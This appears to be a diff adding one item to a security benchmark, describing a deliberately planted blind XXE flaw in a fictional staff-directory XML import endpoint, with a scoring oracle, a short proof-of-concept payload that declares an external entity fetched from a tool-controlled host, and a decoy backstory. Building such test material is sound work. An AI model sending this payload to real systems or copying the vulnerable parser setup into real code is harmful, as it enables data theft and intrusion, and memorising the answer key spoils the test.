@@ -1,0 +1,43 @@
+id: BENCH-CORP-0006
+title: Staff directory import parses XML with an external resolver attached
+app: corp
+component: api
+class: xxe_blind
+severity: critical
+entrypoint:
+  method: POST
+  path: /api/directory/import
+  auth: admin
+  param: body
+  param_in: raw
+  default_value: null
+  content_type: application/xml
+discovery:
+  render: api-only
+  reachable_from:
+  - /admin/directory
+  requires:
+  - form-submit
+  - multi-step-flow
+  difficulty: 4
+oracle:
+  kind: oob
+  condition: 'Document type definitions are processed and a resolver that follows external references
+    is attached, so a declared entity is fetched. The sink is inside that resolver, on the fetch itself:
+    it declares the destination to the egress registry and fires when the parser actually asked for an
+    external resource, whatever the reference resolved to. The response body is discarded and never reflected,
+    so the callback observed by the network -- which is the resolver for the whole target estate -- is
+    the proof. Posting a document that merely declares an entity which is never referenced scores exercise
+    only.'
+  poc: POST /api/directory/import with the administrator's session cookie and <!DOCTYPE staff [<!ENTITY
+    x SYSTEM "http://<any host the tool controls>/s">]><staff><name>&x;</name></staff>
+  signal: corp.directory.import.entity_resolved
+tags:
+- xml
+- oob
+- authenticated
+- admin
+introduced: '2026-09-05'
+decoy_note: The payroll provider ships its staff extract as XML with a DTD, and the import was written
+  against that file. The resolver was attached to make the DTD load, and the setting stayed when the endpoint
+  was opened to uploaded files.
